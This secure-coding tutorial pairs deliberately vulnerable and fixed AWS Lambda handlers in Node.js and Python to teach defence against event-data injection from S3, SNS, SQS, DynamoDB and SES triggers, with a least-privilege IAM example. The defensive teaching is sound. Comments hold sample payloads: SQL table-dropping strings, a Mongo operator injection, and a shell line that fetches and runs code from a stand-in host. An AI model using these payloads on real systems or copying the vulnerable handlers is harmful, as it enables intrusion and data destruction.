# SAS-1: Function Event-Data Injection - Code Examples

Each pair below shows a **vulnerable** AWS Lambda handler and the **secure** version of the same handler, in both Node.js and Python. The examples deliberately use *non-HTTP* triggers—S3, SNS, SQS, DynamoDB Streams, SES—because that is where event-data injection hides. A `serverless.yml` showing least-privilege roles closes the page.

## Example 1: S3 Object Key -> SQL Injection

### Vulnerable (Node.js)

```javascript
const { Client } = require('pg');

exports.handler = async (event) => {
  const client = new Client();
  await client.connect();

  // The object key is chosen by whoever uploaded the file.
  const key = event.Records[0].s3.object.key;
  //   key = "r'); DROP TABLE files;--.pdf"

  // String-built SQL: the key breaks out of the literal.
  await client.query(
    "INSERT INTO files (name) VALUES ('" + key + "')"
  );
  return { ok: true };
};
```

### Secure (Node.js)

```javascript
const { Client } = require('pg');

const KEY_RE = /^[A-Za-z0-9._/-]+$/;   // positive allow-list

exports.handler = async (event) => {
  // 1. Validate the event shape and the key content up front.
  const rec = event?.Records?.[0];
  const key = rec?.s3?.object?.key;
  if (typeof key !== 'string' || key.length > 512 || !KEY_RE.test(key)) {
    throw new Error('Rejected S3 event: invalid object key');
  }

  const client = new Client();
  await client.connect();

  // 2. Parameterised query: the key is bound as data, never parsed as SQL.
  await client.query('INSERT INTO files (name) VALUES ($1)', [key]);
  return { ok: true };
};
```

### Vulnerable (Python)

```python
import psycopg2

def handler(event, context):
    conn = psycopg2.connect(host=DB_HOST, dbname="app")
    cur = conn.cursor()

    key = event["Records"][0]["s3"]["object"]["key"]
    #   key = "r'); DROP TABLE files;--.pdf"

    # String concatenation -> SQL injection.
    cur.execute("INSERT INTO files (name) VALUES ('" + key + "')")
    conn.commit()
    return {"ok": True}
```

### Secure (Python)

```python
import re
import psycopg2

KEY_RE = re.compile(r"^[A-Za-z0-9._/-]+$")

def handler(event, context):
    # 1. Validate before use.
    try:
        key = event["Records"][0]["s3"]["object"]["key"]
    except (KeyError, IndexError, TypeError):
        raise ValueError("Malformed S3 event")
    if not isinstance(key, str) or len(key) > 512 or not KEY_RE.match(key):
        raise ValueError("Invalid object key")

    conn = psycopg2.connect(host=DB_HOST, dbname="app")
    cur = conn.cursor()
    # 2. Parameterised query -- key is bound, not interpreted.
    cur.execute("INSERT INTO files (name) VALUES (%s)", (key,))
    conn.commit()
    return {"ok": True}
```

## Example 2: SNS Message -> OS Command Injection

### Vulnerable (Node.js)

```javascript
const { exec } = require('child_process');

exports.handler = async (event) => {
  // The message body names the file to convert.
  const name = event.Records[0].Sns.Message;
  //   name = "a.png; curl http://evil/s | sh"

  // Shell string interpolation runs the injected command.
  return new Promise((resolve, reject) => {
    exec(`convert /tmp/${name} /tmp/out.jpg`, (err) =>
      err ? reject(err) : resolve({ ok: true }));
  });
};
```

### Secure (Node.js)

```javascript
const { execFile } = require('child_process');
const path = require('path');

const NAME_RE = /^[A-Za-z0-9._-]+$/;
const BASE = '/tmp';

exports.handler = async (event) => {
  // 1. Validate the message as a plain, bounded filename.
  const name = event?.Records?.[0]?.Sns?.Message;
  if (typeof name !== 'string' || !NAME_RE.test(name)) {
    throw new Error('Invalid filename in SNS message');
  }
  // 2. Contain the path.
  const input = path.resolve(BASE, path.basename(name));
  if (!input.startsWith(BASE + path.sep)) throw new Error('Path escape');

  // 3. No shell: arguments passed as an array, so metacharacters are inert.
  return new Promise((resolve, reject) => {
    execFile('convert', [input, '/tmp/out.jpg'], { timeout: 10000 },
      (err) => err ? reject(err) : resolve({ ok: true }));
  });
};
```

### Vulnerable (Python)

```python
import os

def handler(event, context):
    name = event["Records"][0]["Sns"]["Message"]
    #   name = "a.pdf; id"
    # os.system spawns a shell -> command injection.
    os.system("pdftotext /tmp/" + name + " /tmp/out.txt")
    return {"ok": True}
```

### Secure (Python)

```python
import os
import re
import subprocess

NAME_RE = re.compile(r"^[A-Za-z0-9._-]+$")
BASE = "/tmp"

def handler(event, context):
    # 1. Validate.
    name = event["Records"][0]["Sns"]["Message"]
    if not isinstance(name, str) or not NAME_RE.match(name):
        raise ValueError("Invalid filename")
    # 2. Contain the path.
    target = os.path.realpath(os.path.join(BASE, os.path.basename(name)))
    if not target.startswith(BASE + os.sep):
        raise ValueError("Path escape")
    # 3. No shell; args as a list; bounded runtime.
    subprocess.run(
        ["pdftotext", target, "/tmp/out.txt"],
        shell=False, check=True, timeout=10,
    )
    return {"ok": True}
```

## Example 3: SQS Body -> NoSQL / Operator Injection

### Vulnerable (Node.js)

```javascript
const { MongoClient } = require('mongodb');

exports.handler = async (event) => {
  const db = (await MongoClient.connect(process.env.MONGO_URI)).db('app');

  // Body is JSON the sender controls.
  const query = JSON.parse(event.Records[0].body);
  //   body = '{"user":{"$ne":null},"role":"admin"}'

  // Passing the raw object lets operators like $ne through.
  const doc = await db.collection('users').findOne(query);
  return { user: doc };
};
```

### Secure (Node.js)

```javascript
const { MongoClient } = require('mongodb');

exports.handler = async (event) => {
  // 1. Parse, then extract only the scalar fields we expect, coerced to string.
  let body;
  try { body = JSON.parse(event.Records[0].body); }
  catch { throw new Error('Invalid JSON body'); }

  const userId = body.user;
  if (typeof userId !== 'string' || userId.length > 64) {
    throw new Error('Invalid user id');   // rejects {$ne: null}
  }

  const db = (await MongoClient.connect(process.env.MONGO_URI)).db('app');
  // 2. Build the filter from known-good scalars only -- no operators leak in.
  const doc = await db.collection('users').findOne({ user: userId });
  return { user: doc };
};
```

### Vulnerable (Python)

```python
import json
from pymongo import MongoClient

def handler(event, context):
    db = MongoClient(MONGO_URI).app
    query = json.loads(event["Records"][0]["body"])
    #   {"user": {"$ne": null}, "role": "admin"}
    doc = db.users.find_one(query)      # operator injection
    return {"user": doc}
```

### Secure (Python)

```python
import json
from pymongo import MongoClient

def handler(event, context):
    try:
        body = json.loads(event["Records"][0]["body"])
    except (ValueError, KeyError):
        raise ValueError("Invalid message body")

    user_id = body.get("user")
    if not isinstance(user_id, str) or len(user_id) > 64:
        raise ValueError("Invalid user id")   # a dict like {"$ne": None} is rejected

    db = MongoClient(MONGO_URI).app
    # Coerced scalar only -- no query operators can be injected.
    doc = db.users.find_one({"user": user_id})
    return {"user": doc}
```

## Example 4: DynamoDB Stream Attribute -> Downstream Injection

### Vulnerable (Python)

```python
import psycopg2

def handler(event, context):
    wh = psycopg2.connect(host=WAREHOUSE_HOST)
    cur = wh.cursor()
    for rec in event["Records"]:
        img = rec["dynamodb"]["NewImage"]
        bio = img["bio"]["S"]
        #   bio = "'; UPDATE profiles SET role='admin';--"
        # Attribute value written through some other API, injected here.
        cur.execute("INSERT INTO profiles (bio) VALUES ('" + bio + "')")
    wh.commit()
    return {"ok": True}
```

### Secure (Python)

```python
import psycopg2

MAX_BIO = 2000

def handler(event, context):
    wh = psycopg2.connect(host=WAREHOUSE_HOST)
    cur = wh.cursor()
    for rec in event.get("Records", []):
        image = rec.get("dynamodb", {}).get("NewImage", {})
        bio_attr = image.get("bio", {})
        bio = bio_attr.get("S")            # only accept the String type we expect
        if not isinstance(bio, str) or len(bio) > MAX_BIO:
            # Skip malformed/oversized records rather than trusting them.
            continue
        # Parameterised even though the data is "already stored" -- stored != safe.
        cur.execute("INSERT INTO profiles (bio) VALUES (%s)", (bio,))
    wh.commit()
    return {"ok": True}
```

## Example 5: SES Inbound Email -> SQL Injection + Safe Handling

### Vulnerable (Node.js)

```javascript
const { Client } = require('pg');

exports.handler = async (event) => {
  const mail = event.Records[0].ses.mail;
  const subject = mail.commonHeaders.subject;
  //   subject = "ticket'); DELETE FROM tickets;--"

  const client = new Client();
  await client.connect();
  await client.query(
    "INSERT INTO tickets (title) VALUES ('" + subject + "')"
  );
  return { disposition: 'CONTINUE' };
};
```

### Secure (Node.js)

```javascript
const { Client } = require('pg');

exports.handler = async (event) => {
  // Every email header is fully attacker-controlled: validate + parameterise.
  const subject = event?.Records?.[0]?.ses?.mail?.commonHeaders?.subject;
  if (typeof subject !== 'string' || subject.length > 200) {
    throw new Error('Invalid or missing subject');
  }
  const title = subject.trim();

  const client = new Client();
  await client.connect();
  await client.query('INSERT INTO tickets (title) VALUES ($1)', [title]);
  return { disposition: 'CONTINUE' };
};
```

## Example 6: Least-Privilege Roles in serverless.yml

Validation stops the injection; a tight role limits the damage if one is ever missed. Give each function its own role scoped to exactly what it needs.

### Vulnerable (over-privileged, shared wildcard role)

```yaml
service: intake

provider:
  name: aws
  runtime: nodejs20.x
  iam:
    role:
      statements:
        - Effect: Allow
          Action: "*"            # every action...
          Resource: "*"          # ...on every resource. A foothold = account takeover.

functions:
  indexUpload:
    handler: src/s3.handler
    events:
      - s3: { bucket: uploads, event: s3:ObjectCreated:* }
  processQueue:
    handler: src/sqs.handler
    events:
      - sqs: arn:aws:sqs:us-east-1:111122223333:jobs
```

### Secure (per-function least privilege)

```yaml
service: intake

provider:
  name: aws
  runtime: nodejs20.x
  # No account-wide wildcard role.

functions:
  indexUpload:
    handler: src/s3.handler
    events:
      - s3: { bucket: uploads, event: s3:ObjectCreated:* }
    iamRoleStatements:
      - Effect: Allow
        Action: [ "s3:GetObject" ]
        Resource: "arn:aws:s3:::uploads/*"          # read this one bucket
      - Effect: Allow
        Action: [ "dynamodb:PutItem" ]
        Resource: "arn:aws:dynamodb:*:*:table/files" # write this one table

  processQueue:
    handler: src/sqs.handler
    events:
      - sqs: arn:aws:sqs:us-east-1:111122223333:jobs
    iamRoleStatements:
      - Effect: Allow
        Action: [ "sqs:ReceiveMessage", "sqs:DeleteMessage", "sqs:GetQueueAttributes" ]
        Resource: "arn:aws:sqs:us-east-1:111122223333:jobs"
      # Note: no s3:*, no secretsmanager:*, no iam:*, no lambda:InvokeFunction.
```

## What Changed, and Why

| Injection vector | Vulnerable | Secure |
|------------------|------------|--------|
| S3 key -> SQL | Key concatenated into the query | Allow-list validate + parameterised query |
| SNS -> command | `exec`/`os.system` with a shell | `execFile`/`subprocess` args array, no shell, contained path |
| SQS -> NoSQL | Raw JSON passed as a query filter | Extract coerced scalars; reject operators |
| DynamoDB stream | "Stored" attribute trusted verbatim | Type-check + parameterise (stored != safe) |
| SES email | Subject header trusted as a value | Validate length/shape + parameterise |
| IAM role | Wildcard `*`/`*` | Per-function least privilege |

> Every secure handler does the same two things in order: **validate the event field against a strict allow-list**, then **use a safe API at the sink**. The least-privilege role is the backstop for whatever the first two miss.

## Next Steps

- **[Prevention](prevention.md)**: The full layered defence strategy
- **[Attack Vectors](attack-vectors.md)**: How these injections are exploited per source
- **[Serverless Security Track](/learn/serverless)**: Continue the OWASP Serverless Top 10
- **[Practice Range](/practice)**: Fix a vulnerable function hands-on
